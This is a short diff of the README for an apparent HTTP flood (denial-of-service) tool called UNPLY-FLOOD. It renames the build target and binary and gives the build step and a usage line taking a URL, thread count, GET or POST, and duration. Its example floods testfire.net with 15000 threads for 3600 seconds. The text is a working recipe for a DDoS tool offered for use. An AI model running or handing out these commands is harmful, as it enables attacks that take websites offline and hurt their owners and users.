@@ -35,14 +35,14 @@ pkg install golang
 cd UNPLY-FLOOD 
 
 ➢ 𝙍𝙐𝙉 𝙏𝙊𝙊𝙇 - 
-go build UNPLY-DDOS
+go build UNPLY-FLOOD 
        
 
   𝙐𝙎𝘼𝙂𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 
     
-   ❶ ➣./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
+   ❶ ➣./UNPLY-FLOOD  <url> <threads> <get/post> <seconds> <header.txt/nil>
     
-𝙀𝙓 -➣ ./httpflood http://testfire.net/ 15000 get 3600 nil
+𝙀𝙓 -➣ ./UNPLY-FLOOD http://testfire.net/ 15000 get 3600 nil
 
 
 
